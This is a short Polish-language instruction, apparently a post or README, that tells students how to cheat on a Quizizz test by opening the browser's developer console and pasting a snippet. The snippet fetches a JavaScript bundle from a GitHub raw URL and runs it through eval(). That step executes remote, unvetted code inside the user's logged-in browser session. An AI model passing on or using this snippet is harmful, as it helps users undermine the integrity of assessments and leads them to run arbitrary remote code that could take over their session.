Wchodzisz na quzizz na test!
Następnie prawy przycisk myszy i zbadaj element.
pojawiają się zakładki wchodzisz w console 
klikasz obok szczałki przy której nic nie ma i wklejasz kod poniżej i wszystko działa

fetch("https://raw.githubusercontent.com/gbaranski/quizizz-cheat/master/dist/bundle.js")
.then((res) => res.text()
.then((t) => eval(t)))
